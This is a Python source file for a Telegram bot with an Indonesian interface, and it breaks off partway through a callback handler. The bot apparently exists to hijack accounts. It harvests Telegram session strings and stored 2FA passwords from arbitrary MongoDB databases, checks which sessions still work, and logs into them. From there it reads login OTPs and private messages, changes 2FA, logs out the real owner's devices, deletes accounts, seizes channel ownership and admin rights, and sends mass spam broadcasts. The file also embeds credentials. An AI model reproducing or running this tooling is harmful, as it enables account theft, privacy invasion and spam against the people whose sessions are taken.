import asyncio
import logging
import re
from datetime import datetime
from pyrogram import Client, filters, enums, raw
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pymongo import MongoClient
import time
from functools import wraps

API_ID = 31368595
API_HASH = "030eabf98701ef1678f24e0eacdba7ef"
BOT_TOKEN = "8683670792:AAEU0CL1NATYLBViKaU1XalI2ALtMB7tdjE"

# OWNER CONFIG
OWNER_ID = 8027604575
ALLOWED_USERS = {OWNER_ID}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

user_sessions = {}
all_sessions = []
waiting_input = {}
user_chats = {}
multi_session_clients = []
saved_messages_cache = {}  # Cache untuk pesan tersimpan

# ==================== DECORATOR AUTH ====================
def owner_only(func):
    @wraps(func)
    async def wrapper(client, message):
        if message.from_user.id not in ALLOWED_USERS:
            await message.reply("❌ **Akses Ditolak!**\n\nAnda tidak memiliki izin untuk menggunakan bot ini.")
            return
        return await func(client, message)
    return wrapper

def owner_only_callback(func):
    @wraps(func)
    async def wrapper(client, callback_query):
        if callback_query.from_user.id not in ALLOWED_USERS:
            await callback_query.answer("❌ Akses Ditolak!", show_alert=True)
            return
        return await func(client, callback_query)
    return wrapper

# ==================== FUNGSI MONGODB ====================
def get_all_sessions(uri, max_per_db=500):
    try:
        client = MongoClient(uri, serverSelectionTimeoutMS=15000, connectTimeoutMS=10000)
        sessions = []
        
        client.admin.command('ping')
        
        for db_name in client.list_database_names():
            if db_name in ['admin', 'local', 'config']:
                continue
            
            db = client[db_name]
            count = 0
            
            for col_name in db.list_collection_names():
                if count >= max_per_db:
                    break
                    
                try:
                    for doc in db[col_name].find({}).limit(100):
                        if count >= max_per_db:
                            break
                            
                        for field, value in doc.items():
                            if isinstance(value, str) and len(value) > 100:
                                if re.match(r'^[A-Za-z0-9+/=_-]+$', value) and len(value) > 150:
                                    has_2fa = doc.get('has_2fa', doc.get('two_factor', doc.get('2fa', False)))
                                    twofa_hint = doc.get('hint', doc.get('twofa_hint', ''))
                                    twofa_password = doc.get('password', doc.get('2fa_password', doc.get('twofa_password', '')))
                                    sessions.append({
                                        'session': value,
                                        'database': db_name,
                                        'collection': col_name,
                                        'has_2fa': has_2fa,
                                        'twofa_hint': str(twofa_hint) if twofa_hint else '',
                                        'twofa_password': str(twofa_password) if twofa_password else ''
                                    })
                                    count += 1
                except Exception:
                    continue
        
        client.close()
        
        unique = {}
        for s in sessions:
            if s['session'] not in unique:
                unique[s['session']] = s
        
        return list(unique.values())
    except Exception as e:
        logger.error(f"MongoDB error: {e}")
        return []

async def check_session_active(session_string, delay=0.5):
    try:
        await asyncio.sleep(delay)
        app = Client("temp", API_ID, API_HASH, session_string=session_string, in_memory=True, 
                     workdir="temp_sessions", no_updates=True)
        await asyncio.wait_for(app.start(), timeout=10)
        me = await app.get_me()
        await app.stop()
        return True, me
    except:
        return False, None

async def get_account_info(app):
    try:
        me = await app.get_me()
        is_premium = getattr(me, 'is_premium', False)
        
        try:
            pwd_info = await app.invoke(raw.functions.account.GetPassword())
            has_2fa = pwd_info.has_password
            hint = pwd_info.hint if hasattr(pwd_info, 'hint') else None
        except:
            has_2fa = False
            hint = None
        
        devices = []
        try:
            sessions = await app.invoke(raw.functions.account.GetAuthorizations())
            for auth in sessions.authorizations:
                devices.append({
                    'device': f"{auth.device_model} ({auth.platform})",
                    'active': auth.current,
                    'date': datetime.fromtimestamp(auth.date_created).strftime('%d/%m/%Y')
                })
        except:
            pass
        
        return {
            'me': me, 
            'has_2fa': has_2fa, 
            'hint': hint,
            'is_premium': is_premium,
            'devices': devices
        }
    except Exception as e:
        raise Exception(f"Error: {e}")

async def get_all_dialogs(app):
    """Ambil dialog dengan username"""
    try:
        logger.info("Mengambil daftar chat...")
        chats = []
        async for dialog in app.get_dialogs(limit=200):
            try:
                chat = dialog.chat
                if not chat:
                    continue
                name = chat.title or chat.first_name or chat.username or str(chat.id)
                username = chat.username if hasattr(chat, 'username') and chat.username else None
                chat_type = "private"
                if hasattr(chat, 'type'):
                    if str(chat.type) == "ChatType.CHANNEL":
                        chat_type = "channel"
                    elif str(chat.type) in ["ChatType.GROUP", "ChatType.SUPERGROUP"]:
                        chat_type = "group"
                chats.append({
                    'id': chat.id, 
                    'name': name, 
                    'username': username,
                    'type': chat_type
                })
                if len(chats) >= 200:
                    break
            except Exception:
                continue
        return chats
    except Exception as e:
        logger.error(f"Error get dialogs: {e}")
        return []

async def get_my_channels(app):
    """Ambil channel dimana akun adalah OWNER dengan username"""
    try:
        channels = []
        me = await app.get_me()
        
        async for dialog in app.get_dialogs():
            chat = dialog.chat
            if hasattr(chat, 'type') and ('channel' in str(chat.type).lower() or 'supergroup' in str(chat.type).lower()):
                try:
                    member = await app.get_chat_member(chat.id, me.id)
                    if member.status == enums.ChatMemberStatus.OWNER:
                        username = chat.username if hasattr(chat, 'username') and chat.username else None
                        channels.append({
                            'id': chat.id,
                            'title': chat.title,
                            'username': username,
                            'access_hash': getattr(chat, 'access_hash', 0)
                        })
                except Exception as e:
                    logger.error(f"Error cek channel {chat.title}: {e}")
                    continue
        return channels
    except Exception as e:
        logger.error(f"Error get channels: {e}")
        return []

async def get_saved_messages(app, limit=100):
    """Ambil pesan tersimpan dengan limit lebih besar"""
    try:
        saved_id = (await app.get_me()).id
        messages = []
        async for msg in app.get_chat_history(saved_id, limit=limit):
            if msg.text:
                messages.append({
                    'text': msg.text,
                    'date': msg.date.strftime('%d/%m/%Y %H:%M:%S'),
                    'msg_id': msg.id
                })
        return messages[::-1]  # Urutkan dari lama ke baru
    except Exception as e:
        logger.error(f"Error get saved messages: {e}")
        return []

async def get_channel_admins(app, channel_id):
    """Ambil daftar admin di channel dengan akses lengkap"""
    try:
        admins = []
        channel = await app.get_chat(channel_id)
        
        async for member in app.get_chat_members(channel_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
            try:
                privileges = []
                if member.privileges:
                    if member.privileges.can_manage_chat:
                        privileges.append("📋 Manage Chat")
                    if member.privileges.can_change_info:
                        privileges.append("ℹ️ Change Info")
                    if member.privileges.can_post_messages:
                        privileges.append("📢 Post Messages")
                    if member.privileges.can_edit_messages:
                        privileges.append("✏️ Edit Messages")
                    if member.privileges.can_delete_messages:
                        privileges.append("🗑️ Delete Messages")
                    if member.privileges.can_restrict_members:
                        privileges.append("⛔ Restrict Members")
                    if member.privileges.can_invite_users:
                        privileges.append("👥 Invite Users")
                    if member.privileges.can_pin_messages:
                        privileges.append("📌 Pin Messages")
                    if member.privileges.can_promote_members:
                        privileges.append("⭐ Promote Members")
                    if member.privileges.can_manage_video_chats:
                        privileges.append("🎥 Manage Video Chats")
                
                admin_info = {
                    'user_id': member.user.id,
                    'first_name': member.user.first_name,
                    'username': member.user.username or '-',
                    'is_owner': member.status == enums.ChatMemberStatus.OWNER,
                    'is_admin': member.status in [enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER],
                    'privileges': privileges,
                    'can_be_edited': getattr(member, 'can_be_edited', False)
                }
                admins.append(admin_info)
            except Exception as e:
                logger.error(f"Error get admin info: {e}")
                continue
                
        return admins, channel
    except Exception as e:
        logger.error(f"Error get channel admins: {e}")
        return [], None

async def get_all_channels_with_admins(app):
    """Ambil semua channel yang di-OWNER dan daftar adminnya"""
    try:
        channels = await get_my_channels(app)
        result = []
        
        for ch in channels:
            admins, channel = await get_channel_admins(app, ch['id'])
            result.append({
                'id': ch['id'],
                'title': ch['title'],
                'username': ch['username'],
                'admins': admins,
                'admin_count': len(admins)
            })
            await asyncio.sleep(0.5)
            
        return result
    except Exception as e:
        logger.error(f"Error get all channels admins: {e}")
        return []

async def add_admin_to_channel(app, channel_id, target_username):
    """Add admin dengan akses LENGKAP ke channel"""
    try:
        target_username = target_username.strip().replace('@', '')
        target = await app.get_users(target_username)
        channel = await app.get_chat(channel_id)
        
        await app.promote_chat_member(
            chat_id=channel_id,
            user_id=target.id,
            can_manage_chat=True,
            can_change_info=True,
            can_post_messages=True,
            can_edit_messages=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_promote_members=True,
            can_manage_video_chats=True
        )
        
        try:
            await app.invite_users(channel_id, target.id)
        except:
            pass
            
        return True, f"✅ **{target.first_name}** berhasil dijadikan ADMIN di **{channel.title}**\n\n📋 **Akses:** Lengkap"
    except Exception as e:
        error_msg = str(e)
        if "USER_NOT_MUTUAL_CONTACT" in error_msg:
            return False, "❌ Target harus JOIN channel terlebih dahulu!"
        elif "CHAT_ADMIN_REQUIRED" in error_msg:
            return False, "❌ Akun ini bukan ADMIN channel!"
        elif "USER_ALREADY_ADMIN" in error_msg:
            return False, "⚠️ User sudah menjadi admin!"
        else:
            return False, f"❌ Gagal: {error_msg[:150]}"

async def add_admin_to_all_channels(app, target_username):
    """Add admin ke semua channel yang di-OWNER"""
    channels = await get_my_channels(app)
    
    if not channels:
        return False, "❌ Tidak ada channel yang menjadi OWNER!"
    
    results = []
    success_count = 0
    
    for ch in channels:
        success, msg = await add_admin_to_channel(app, ch['id'], target_username)
        if success:
            success_count += 1
            results.append(f"✅ {ch['title']}")
        else:
            results.append(f"❌ {ch['title']}: {msg[:50]}")
        await asyncio.sleep(1)
    
    report = f"📋 **HASIL ADD ADMIN KE SEMUA CHANNEL**\n\n"
    report += f"✅ Berhasil: {success_count}/{len(channels)}\n\n"
    report += "📝 **DETAIL:**\n" + "\n".join(results[:20])
    
    return True, report

async def leave_all_channels(app):
    """Keluar dari semua channel yang di-OWNER"""
    channels = await get_my_channels(app)
    
    if not channels:
        return False, "❌ Tidak ada channel yang menjadi OWNER!"
    
    results = []
    success_count = 0
    
    for ch in channels:
        try:
            await app.leave_chat(ch['id'])
            success_count += 1
            results.append(f"✅ {ch['title']}")
        except Exception as e:
            results.append(f"❌ {ch['title']}: {str(e)[:50]}")
        await asyncio.sleep(1)
    
    report = f"📋 **HASIL KELUAR DARI SEMUA CHANNEL**\n\n"
    report += f"✅ Berhasil: {success_count}/{len(channels)}\n\n"
    report += "📝 **DETAIL:**\n" + "\n".join(results[:20])
    
    return True, report

async def transfer_owner_channel(app, channel_id, target_username):
    """Transfer owner channel"""
    try:
        target_username = target_username.strip().replace('@', '')
        target = await app.get_users(target_username)
        channel = await app.get_chat(channel_id)
        channel_full = await app.get_chat(channel_id)
        
        from pyrogram.raw.functions.channels import EditCreator
        from pyrogram.raw.types import InputChannel, InputUser
        
        input_channel = InputChannel(
            channel_id=channel.id,
            access_hash=channel_full.access_hash if hasattr(channel_full, 'access_hash') else 0
        )
        
        input_user = InputUser(
            user_id=target.id,
            access_hash=target.access_hash if hasattr(target, 'access_hash') else 0
        )
        
        await app.invoke(EditCreator(channel=input_channel, user_id=input_user, password=""))
        
        return True, f"✅ **SUKSES!**\n\nChannel **{channel.title}** sekarang milik {target.first_name}"
        
    except Exception as e:
        error_msg = str(e)
        if "USER_NOT_MUTUAL_CONTACT" in error_msg:
            return False, "❌ Target harus JOIN channel terlebih dahulu!"
        elif "CHAT_ADMIN_REQUIRED" in error_msg:
            return False, "❌ Akun ini bukan OWNER channel!"
        else:
            return False, f"❌ Gagal: {error_msg[:150]}"

async def get_messages(app, chat_id, limit=100):
    try:
        messages = []
        async for msg in app.get_chat_history(chat_id, limit=limit):
            if msg.text:
                messages.append({
                    'text': msg.text[:300],
                    'out': msg.outgoing,
                    'date': msg.date.strftime('%H:%M')
                })
        return messages[::-1]
    except Exception:
        return []

async def delete_account(app):
    try:
        await app.invoke(raw.functions.account.DeleteAccount(reason="Dihapus via bot"))
        return True, "⚠️ AKUN DIHAPUS PERMANEN!"
    except Exception as e:
        return False, f"❌ Gagal: {e}"

async def logout_other_devices(app):
    try:
        await app.invoke(raw.functions.auth.ResetAuthorizations())
        return True, "✅ Semua device lain logout!"
    except Exception as e:
        return False, f"❌ Gagal: {e}"

async def get_last_otp(app, limit=5):
    try:
        messages = []
        chat_id = 777000
        try:
            async for msg in app.get_chat_history(chat_id, limit=limit):
                if msg and msg.text:
                    otp_match = re.search(r'\b(\d{5,6})\b', msg.text)
                    otp_code = otp_match.group(1) if otp_match else None
                    messages.append({
                        'text': msg.text[:150],
                        'date': msg.date.strftime('%d/%m %H:%M:%S'),
                        'otp': otp_code
                    })
        except:
            pass
        return messages
    except:
        return []

async def set_2fa_password(app, new_password):
    try:
        password = await app.invoke(raw.functions.account.GetPassword())
        await app.invoke(
            raw.functions.account.UpdatePasswordSettings(
                password=password,
                new_settings=raw.types.account.PasswordInputSettings(
                    new_password=new_password
                )
            )
        )
        return True, f"✅ Password 2FA berhasil dibuat!\n🔑 Password: `{new_password}`"
    except Exception as e:
        return False, f"❌ Gagal: {e}"

async def broadcast_to_all(app, text, target_type="all"):
    chats = await get_all_dialogs(app)
    results = []
    total = 0
    success_count = 0
    
    for chat in chats:
        if target_type == "groups" and chat['type'] == 'private':
            continue
        elif target_type == "channels" and chat['type'] != 'channel':
            continue
        elif target_type == "private" and chat['type'] != 'private':
            continue
        
        total += 1
        if total > 100:
            results.append(f"⏸️ Limit tercapai")
            break
            
        try:
            await app.send_message(chat['id'], text)
            success_count += 1
            results.append(f"✅ {chat['name'][:30]}")
        except Exception as e:
            results.append(f"❌ {chat['name'][:30]}: {str(e)[:30]}")
        
        await asyncio.sleep(0.5)
    
    report = f"📡 **BROADCAST SELESAI!**\n\n✅ Berhasil: {success_count}/{total}\n🎯 Target: {target_type}\n\n📋 **DETAIL:**\n" + "\n".join(results[:20])
    return report

async def broadcast_all_sessions(clients, text, target_type="all"):
    if not clients:
        return "❌ Tidak ada session yang aktif!"
    
    report = f"📡 **MULTI SESSION BROADCAST**\n\n"
    report += f"📝 Pesan: {text[:100]}\n"
    report += f"🎯 Target: {target_type}\n"
    report += f"👥 Total akun: {len(clients)}\n\n"
    
    for i, client_data in enumerate(clients):
        app = client_data['client']
        me = client_data['me']
        name = f"{me.first_name} (@{me.username or 'no username'})"
        
        chats = await get_all_dialogs(app)
        sent = 0
        total_chats = 0
        
        for chat in chats:
            if target_type == "groups" and chat['type'] == 'private':
                continue
            elif target_type == "channels" and chat['type'] != 'channel':
                continue
            elif target_type == "private" and chat['type'] != 'private':
                continue
            
            total_chats += 1
            if total_chats > 50:
                break
                
            try:
                await app.send_message(chat['id'], text)
                sent += 1
                await asyncio.sleep(0.3)
            except:
                pass
        
        report += f"\n{i+1}. {name}: {sent}/{total_chats} terkirim"
    
    return report

# ==================== KEYBOARD MENU ====================
def session_list_menu(sessions, page=0, per_page=6):
    total = len(sessions)
    if total == 0:
        return None
    
    total_pages = (total - 1) // per_page + 1
    start = page * per_page
    end = min(start + per_page, total)
    
    buttons = []
    for i in range(start, end):
        s = sessions[i]
        status = "🔐" if s.get('has_2fa') else "🔓"
        name = s['database'][:15]
        twofa_info = ""
        if s.get('twofa_password'):
            twofa_info = " 🔑"
        buttons.append([InlineKeyboardButton(f"{status} {name}{twofa_info}", callback_data=f"sel_{i}")])
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"page_{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"page_{page+1}"))
    
    if nav:
        buttons.append(nav)
    
    buttons.append([InlineKeyboardButton("❌ Batal", callback_data="cancel")])
    
    return InlineKeyboardMarkup(buttons)

def saved_messages_menu(page=0, total_pages=1):
    """Menu untuk pesan tersimpan dengan navigasi"""
    buttons = []
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Awal", callback_data="saved_first"))
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"saved_prev_{page}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop"))
    if page + 1 < total_pages:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"saved_next_{page}"))
        nav.append(InlineKeyboardButton("Akhir ▶️", callback_data="saved_last"))
    
    if nav:
        buttons.append(nav)
    
    buttons.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_saved")])
    buttons.append([InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")])
    
    return InlineKeyboardMarkup(buttons)

def main_menu(index, total, has_2fa_password=False):
    """Menu utama dengan indikator 2FA password dari DB"""
    twofa_indicator = " 🔑" if has_2fa_password else ""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("📡 Cek OTP", callback_data="show_otp")],
        [InlineKeyboardButton("📝 PESAN TERSIMPAN", callback_data="saved_messages")],
        [InlineKeyboardButton("👥 Daftar Chat", callback_data="list_chats")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="broadcast_menu")],
        [InlineKeyboardButton(f"🔐 Info 2FA{twofa_indicator}", callback_data="show_2fa")],
        [InlineKeyboardButton("🔑 Set/Ubah 2FA", callback_data="set_2fa")],
        [InlineKeyboardButton("👑 DAFTAR ADMIN CHANNEL", callback_data="list_admins")],
        [InlineKeyboardButton("👑 ADD ADMIN KE SEMUA CHANNEL", callback_data="add_admin_all")],
        [InlineKeyboardButton("🚪 OUT DARI SEMUA CHANNEL", callback_data="out_all_channels")],
        [InlineKeyboardButton("📱 Logout Device Lain", callback_data="logout_devices")],
        [InlineKeyboardButton("🗑️ Hapus Akun", callback_data="delete_account")],
        [InlineKeyboardButton("📋 Copy Session", callback_data="copy_session")],
        [InlineKeyboardButton("◀️ Prev", callback_data="prev_acc"), 
         InlineKeyboardButton(f"{index}/{total}", callback_data="noop"),
         InlineKeyboardButton("Next ▶️", callback_data="next_acc")],
        [InlineKeyboardButton("🔙 Kembali ke Daftar", callback_data="back_to_list")]
    ])

def broadcast_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 BROADCAST KE SEMUA CHAT", callback_data="broadcast_all")],
        [InlineKeyboardButton("👥 BROADCAST KE GROUP", callback_data="broadcast_groups")],
        [InlineKeyboardButton("📢 BROADCAST KE CHANNEL", callback_data="broadcast_channels")],
        [InlineKeyboardButton("👤 BROADCAST KE PRIVATE", callback_data="broadcast_private")],
        [InlineKeyboardButton("🌐 MULTI SESSION BROADCAST", callback_data="multi_broadcast_menu")],
        [InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")]
    ])

def multi_broadcast_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 BROADCAST ALL SESSIONS", callback_data="multi_all")],
        [InlineKeyboardButton("👥 MULTI BROADCAST GROUPS", callback_data="multi_groups")],
        [InlineKeyboardButton("📢 MULTI BROADCAST CHANNELS", callback_data="multi_channels")],
        [InlineKeyboardButton("👤 MULTI BROADCAST PRIVATE", callback_data="multi_private")],
        [InlineKeyboardButton("📊 LIAT SESSION AKTIF", callback_data="list_multi_sessions")],
        [InlineKeyboardButton("🔙 Kembali", callback_data="broadcast_menu")]
    ])

def multi_control_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 BROADCAST ALL SESSIONS", callback_data="multi_all")],
        [InlineKeyboardButton("👥 MULTI BROADCAST GROUPS", callback_data="multi_groups")],
        [InlineKeyboardButton("📢 MULTI BROADCAST CHANNELS", callback_data="multi_channels")],
        [InlineKeyboardButton("👤 MULTI BROADCAST PRIVATE", callback_data="multi_private")],
        [InlineKeyboardButton("📊 LIAT SESSION AKTIF", callback_data="list_multi_sessions")],
        [InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")]
    ])

def channel_list_menu(channels, page=0, per_page=8):
    total = len(channels)
    if total == 0:
        return None
    
    total_pages = (total - 1) // per_page + 1
    start = page * per_page
    end = min(start + per_page, total)
    
    buttons = []
    for i in range(start, end):
        ch = channels[i]
        username_display = f" @{ch['username']}" if ch.get('username') else ""
        buttons.append([InlineKeyboardButton(f"📢 {ch['title'][:20]}{username_display}", callback_data=f"view_admins_{i}")])
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"ch_page_{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"ch_page_{page+1}"))
    
    if nav:
        buttons.append(nav)
    
    buttons.append([InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")])
    
    return InlineKeyboardMarkup(buttons)

def chat_list_menu(chats, page=0, per_page=10):
    total = len(chats)
    start = page * per_page
    end = min(start + per_page, total)
    
    buttons = []
    for i in range(start, end):
        c = chats[i]
        icon = "📢" if c['type'] == 'channel' else "👥" if c['type'] == 'group' else "👤"
        name = c['name'][:25]
        username_display = f" @{c['username']}" if c.get('username') else ""
        buttons.append([InlineKeyboardButton(f"{icon} {name}{username_display}", callback_data=f"view_chat_{i}")])
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"chat_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"chat_page_{page+1}"))
    if nav:
        buttons.append(nav)
    
    buttons.append([InlineKeyboardButton("🔙 Kembali", callback_data="back_to_main")])
    return InlineKeyboardMarkup(buttons)

def chat_action_menu(chat_id, chat_name, chat_type, chat_username=None):
    buttons = [
        [InlineKeyboardButton("📜 Lihat Pesan", callback_data=f"view_msgs_{chat_id}")]
    ]
    if chat_type == 'channel':
        buttons.append([InlineKeyboardButton("👑 TRANSFER OWNER", callback_data=f"transfer_owner_{chat_id}")])
    buttons.append([InlineKeyboardButton("🔙 Kembali", callback_data="back_to_chats")])
    return InlineKeyboardMarkup(buttons)

def format_account_short(info, index, total, session_string=None, db_2fa_password=None):
    me = info['me']
    premium_icon = "✅" if info.get('is_premium') else "❌"
    
    text = f"📋 **AKUN {index}/{total}**\n\n"
    text += f"👤 **Nama:** {me.first_name or ''} {me.last_name or ''}\n"
    text += f"📞 **Username:** @{me.username or '-'}\n"
    text += f"🆔 **ID:** `{me.id}`\n"
    text += f"📱 **Nomor:** +{getattr(me, 'phone_number', '-')}\n"
    text += f"💎 **Premium:** {premium_icon}\n"
    text += f"🔐 **2FA:** {'✅ AKTIF' if info['has_2fa'] else '❌ TIDAK'}\n"
    
    if info['has_2fa'] and info.get('hint'):
        text += f"💡 **Hint 2FA:** `{info['hint']}`\n"
    
    if db_2fa_password:
        text += f"🔑 **2FA PASSWORD (DB):** `{db_2fa_password}`\n"
    
    if info.get('devices'):
        text += f"\n📱 **DEVICE LOGIN:**\n"
        for dev in info['devices'][:3]:
            active = "⭐ AKTIF" if dev['active'] else "💤"
            text += f"   • {dev['device']} ({active})\n"
    
    if session_string:
        text += f"\n🔑 **SESSION STRING:**\n`{session_string[:80]}...`\n"
    
    return text

# ==================== BOT ====================
bot = Client("auto_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start") & filters.private)
@owner_only
async def start_cmd(_, m):
    await m.reply(
        "🤖 **BOT CONTROL ULTIMATE**\n\n"
        "📌 **Kirim MongoDB URI** atau **String Session**\n\n"
        "✅ **FITUR LENGKAP:**\n"
        "• 📢 BROADCAST (Single & Multi Session)\n"
        "• 📝 PESAN TERSIMPAN (Dengan navigasi slide)\n"
        "• 👑 DAFTAR ADMIN CHANNEL\n"
        "• 👑 ADD ADMIN KE SEMUA CHANNEL\n"
        "• 👑 TRANSFER OWNER CHANNEL\n"
        "• 🚪 OUT DARI SEMUA CHANNEL\n"
        "• 📡 OTP & PESAN\n"
        "• 🔐 Info/Set 2FA + Tampilkan 2FA dari DB\n"
        "• 📋 COPY SESSION STRING\n"
        "• 🌐 MULTI SESSION CONTROL\n"
        "• ◀️ ▶️ Slide Akun",
        parse_mode=enums.ParseMode.MARKDOWN
    )

@bot.on_message(filters.command("cancel") & filters.private)
@owner_only
async def cancel_cmd(_, m):
    uid = m.chat.id
    if uid in waiting_input:
        waiting_input.pop(uid)
    await m.reply("✅ Operasi dibatalkan.")

@bot.on_message(filters.command("addakses") & filters.private)
async def add_access_cmd(_, m):
    if m.from_user.id != OWNER_ID:
        await m.reply("❌ Hanya owner yang bisa menggunakan perintah ini!")
        return
    
    try:
        args = m.text.split()
        if len(args) < 2:
            await m.reply("❌ Format: `/addakses user_id`")
            return
        
        user_id = int(args[1])
        ALLOWED_USERS.add(user_id)
        await m.reply(f"✅ User `{user_id}` ditambahkan!")
    except:
        await m.reply("❌ Error!")

@bot.on_message(filters.command("listakses") & filters.private)
async def list_access_cmd(_, m):
    if m.from_user.id != OWNER_ID:
        await m.reply("❌ Hanya owner!")
        return
    
    users_list = "\n".join([f"• `{uid}`" for uid in ALLOWED_USERS])
    await m.reply(f"👑 **Daftar Akses:**\n{users_list}")

@bot.on_message(filters.command("delakses") & filters.private)
async def remove_access_cmd(_, m):
    if m.from_user.id != OWNER_ID:
        await m.reply("❌ Hanya owner!")
        return
    
    try:
        args = m.text.split()
        if len(args) < 2:
            await m.reply("❌ Format: `/delakses user_id`")
            return
        
        user_id = int(args[1])
        if user_id == OWNER_ID:
            await m.reply("❌ Tidak bisa hapus owner!")
            return
        
        if user_id in ALLOWED_USERS:
            ALLOWED_USERS.remove(user_id)
            await m.reply(f"✅ Akses user `{user_id}` dihapus!")
        else:
            await m.reply(f"❌ User tidak memiliki akses!")
    except:
        await m.reply("❌ Error!")

@bot.on_message(filters.text & filters.private)
@owner_only
async def main_handler(_, m):
    global all_sessions, multi_session_clients
    uid = m.chat.id
    text = m.text.strip()
    
    # Handle waiting input
    if uid in waiting_input:
        data = waiting_input[uid]
        
        if data['mode'] == 'delete_confirm':
            if text.upper() == "YA_HAPUS":
                success, msg = await delete_account(data['app'])
                await m.reply(msg)
                if success:
                    user_sessions.pop(uid, None)
            else:
                await m.reply("❌ Ketik YA_HAPUS")
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'set_2fa':
            if len(text) < 4:
                await m.reply("❌ Password minimal 4 karakter!")
                return
            success, msg = await set_2fa_password(data['app'], text)
            await m.reply(msg)
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'transfer_owner':
            success, msg = await transfer_owner_channel(data['app'], data['chat_id'], text)
            await m.reply(msg)
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'add_admin_all':
            success, msg = await add_admin_to_all_channels(data['app'], text)
            await m.reply(msg)
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'out_all_confirm':
            if text.upper() == "YA_OUT":
                success, msg = await leave_all_channels(data['app'])
                await m.reply(msg)
            else:
                await m.reply("❌ Ketik YA_OUT")
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'broadcast':
            await m.reply("🔄 Broadcast berjalan...")
            report = await broadcast_to_all(data['app'], text, data.get('target', 'all'))
            await m.reply(report)
            waiting_input.pop(uid)
            return
        
        elif data['mode'] == 'multi_broadcast':
            await m.reply("🌐 Multi Broadcast berjalan...")
            report = await broadcast_all_sessions(multi_session_clients, text, data.get('target', 'all'))
            await m.reply(report)
            waiting_input.pop(uid)
            return
        
        return
    
    # Proses input baru
    msg = await m.reply("⏳ Memproses...")
    
    if text.startswith('mongodb'):
        all_sessions = get_all_sessions(text)
        if not all_sessions:
            await msg.edit_text("❌ Tidak ada session!")
            return
        
        valid_sessions = []
        for i, s in enumerate(all_sessions):
            if i % 5 == 0:
                await msg.edit_text(f"📊 Cek session... {i}/{len(all_sessions)}")
            success, _ = await check_session_active(s['session'], delay=0.5)
            if success:
                valid_sessions.append(s)
        
        all_sessions = valid_sessions
        if all_sessions:
            has_2fa = sum(1 for s in all_sessions if s.get('has_2fa'))
            has_2fa_pass = sum(1 for s in all_sessions if s.get('twofa_password'))
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ LOGIN SEMUA SESSION", callback_data="login_all_sessions")],
                [InlineKeyboardButton("🔍 PILIH SESSION SATU-SATU", callback_data="select_single")]
            ])
            await msg.edit_text(
                f"✅ **{len(all_sessions)} Session Aktif!**\n"
                f"🔐 Ada 2FA: {has_2fa}\n"
                f"🔓 Tanpa 2FA: {len(all_sessions)-has_2fa}\n"
                f"🔑 2FA Password di DB: {has_2fa_pass}\n\n"
                f"Apakah ingin login semua session?",
                reply_markup=keyboard
            )
        else:
            await msg.edit_text("❌ Tidak ada session aktif!")
        return
    
    elif len(text) > 100 and re.match(r'^[A-Za-z0-9+/=_-]+$', text):
        await msg.edit_text("🔐 Login...")
        try:
            app = Client(f"s_{uid}", API_ID, API_HASH, session_string=text, in_memory=True, no_updates=True)
            await app.start()
            info = await get_account_info(app)
            user_sessions[uid] = {'app': app, 'info': info, 'session_string': text}
            await msg.edit_text(
                format_account_short(info, 1, 1, text),
                reply_markup=main_menu(1, 1, False)
            )
        except Exception as e:
            await msg.edit_text(f"❌ {str(e)[:100]}")
        return
    
    else:
        await msg.edit_text("❌ Kirim MongoDB URI atau String Session!")

# ==================== CALLBACK HANDLER ====================
@bot.on_callback_query()
@owner_only_callback
async def callback_handler(c, q: CallbackQuery):
    global all_sessions, multi_session_clients, saved_messages_cache
    uid = q.message.chat.id
    data = q.data
    
    if data == "noop" or data == "cancel":
        if data == "cancel":
            await q.message.delete()
        await q.answer()
        return
    
    # ==================== PESAN TERSIMPAN ====================
    if data == "saved_messages":
        ud = user_sessions.get(uid)
        if not ud:
            await q.answer("Session tidak ditemukan!", show_alert=True)
            return
        
        await q.answer("Mengambil pesan tersimpan...")
        await q.message.edit_text("📝 **Mengambil pesan tersimpan...**\n\n⏳ Mohon tunggu...")
        
        messages = await get_saved_messages(ud['app'], 200)
        
        if not messages:
